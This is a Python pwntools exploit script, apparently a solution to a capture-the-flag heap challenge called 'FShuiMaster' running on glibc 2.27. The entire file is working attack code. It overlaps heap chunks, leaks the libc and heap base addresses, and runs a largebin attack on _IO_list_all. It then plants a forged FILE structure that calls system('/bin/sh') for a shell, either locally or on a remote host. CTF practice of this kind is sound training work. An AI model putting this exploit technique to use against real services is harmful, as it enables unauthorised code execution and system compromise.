#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = ''
port = ''
reomote_addr = [ip,port]
binary = './FShuiMaster'

libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#--------------------------------libc-2.27.so--------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	base = addr - offset
	return base

def init():
	ru("Please Write U Name on the Book\n\n")
	sl("Epiphany")

def menu(idx):
	ru("Five: Finished!\n\n")
	sl(str(idx))

def add(size,content):
	menu(1)
	ru("Number of words?\n")
	sl(str(size))
	ru("please input U character\n")
	sd(content)

def free(idx):
	menu(3)
	ru("please Input the page U want 2 tear off\n")
	sl(str(idx))

def edit(idx,content):
	menu(2)
	ru("please input the page U want 2 change\n")
	sl(str(idx))
	ru("Now Change U this page : %d\n"%idx)
	sd(content)

def scan(idx):
	menu(4)
	ru("please Input The page U want 2 scan\n")
	sl(str(idx))

def finish():
	menu(5)


attach(p,'b main')
init()
#------------------------------------------------------overlap
add(0x440,'Epiphany1') #0
add(0x448,'Epiphany1') #1
add(0x4f0,'Epiphany1') #2
add(0x440,'Epiphany2') #3

free(0)

payload = 'a'*0x440 + p64(0x8a0)
edit(1,payload)
free(2)
#------------------------------------------------------leak
add(0x440,'Epiphany1') #4
scan(1)
libc_base = leak(0x3ebc40+96)
lg("libc_base")

#------------------------------------------------------leak heap addr
add(0x448,'Epiphany1') #5 1
add(0x4f0,'Epiphany1') #6


add(0x440,'Epiphany1') #7
add(0x448,'Epiphany1') #8
add(0x450,'Epiphany1') #9

add(0x440,'Epiphany1') #10

free(7)
free(9)

#re alloc 7->9 largebin
add(0x500,'Epiphany1') #11

#chunk out use bk leak
add(0x440, 'Epiphany') #12
pause()
scan(12)

p.recv(8)
heap_base = u64(rv(6)+'\x00'+'\x00') - 0x1440
lg("heap_base")
heap_addr = heap_base + 0x1440
lg("heap_addr")
#------------------------------------------------------fake IO FSOP
_IO_list_all_addr = libc_base + libc.sym['_IO_list_all']
system_addr = libc_base + libc.sym['system']
lg("system_addr")
lg("_IO_list_all_addr")

#------------------------------------------------------largebin attack to IO_list

f = IO_FILE_plus_struct()
pay = f.getshell_by_str_jumps_finish_when_exit(libc_base + 0x3e8360, libc_base+libc.sym.system, libc_base+libc.search("/bin/sh").next())
free(1)
# pause()


payload = 0x58*'a' + p64(heap_addr + 0x110)
payload = payload.ljust(0xb0,'a')
payload += p64(0xffffffffffffffff)
payload = payload.ljust(0x100,'a')
payload += pay+'\n'

add(0x450,payload) #13

free(13)


edit(5, p64(0x3ec0a0 + libc_base) + p64(libc_base + libc.sym['_IO_list_all']-0x10)[:7]+"\n")

add(0x500,'a')
pause()
finish()
pause()
it()


